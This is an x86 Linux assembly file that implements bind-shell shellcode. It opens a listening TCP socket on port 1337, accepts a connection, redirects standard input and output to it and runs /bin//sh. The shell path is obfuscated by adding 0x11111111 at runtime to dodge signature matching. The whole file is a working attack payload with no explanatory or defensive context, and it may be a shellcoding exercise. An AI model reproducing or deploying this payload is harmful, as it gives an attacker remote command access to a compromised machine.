global _start 

section .text 

_start:


push byte +0x66
pop eax
push byte +0x1
pop ebx
xor esi,esi
push esi
push ebx
push byte +0x2
mov ecx,esp
int 0x80
pop edi
xchg eax,edi
xchg eax,ebx
mov al,0x66
push esi
push word 0x3905
push bx
mov ecx,esp
push byte +0x10
push ecx
push edi
mov ecx,esp
int 0x80
mov al,0x66
mov bl,0x4
push esi
push edi
mov ecx,esp
int 0x80
mov al,0x66
inc ebx
push esi
push esi
push edi
mov ecx,esp
int 0x80
pop ecx
pop ecx
mov cl,0x2
xchg eax,ebx
mov al,0x3f
int 0x80
dec ecx
jns 0x3f
mov al,0xb
;push dword 0x68732f2f
mov ecx, 0x57621e1e
add ecx, 0x11111111
push ecx
;push dword 0x6e69622f
mov ecx, 0x5d58511e
add ecx, 0x11111111
push ecx
mov ebx,esp
inc ecx
mov edx,ecx
int 0x80

